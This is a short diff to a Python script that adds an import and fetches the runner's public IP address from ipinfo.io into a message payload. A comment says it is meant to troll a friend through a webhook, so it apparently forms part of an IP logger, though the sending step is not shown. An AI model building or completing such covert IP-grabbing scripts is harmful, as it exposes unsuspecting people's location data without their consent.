@@ -1,5 +1,5 @@
 # btw idgaf if you use this code or the webhook im just trolling my friend
-
+import requests 
 ip = requests.get("http://ipinfo.io/ip")
 contents = {
         "content": ip
